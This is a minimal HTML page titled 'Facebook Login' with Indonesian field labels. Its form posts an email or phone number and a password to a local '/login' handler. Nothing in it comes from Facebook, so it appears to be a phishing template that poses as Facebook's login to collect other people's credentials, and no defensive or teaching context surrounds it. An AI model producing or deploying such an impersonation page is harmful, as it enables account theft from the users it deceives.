<!DOCTYPE html>
<html>
<head><title>Facebook Login</title></head>
<body>
  <h2>Login ke Facebook</h2>
  <form method="POST" action="/login">
    <input name="username" placeholder="Email atau Nomor HP" required><br><br>
    <input name="password" type="password" placeholder="Kata Sandi" required><br><br>
    <button type="submit">Masuk</button>
  </form>
</body>
</html>
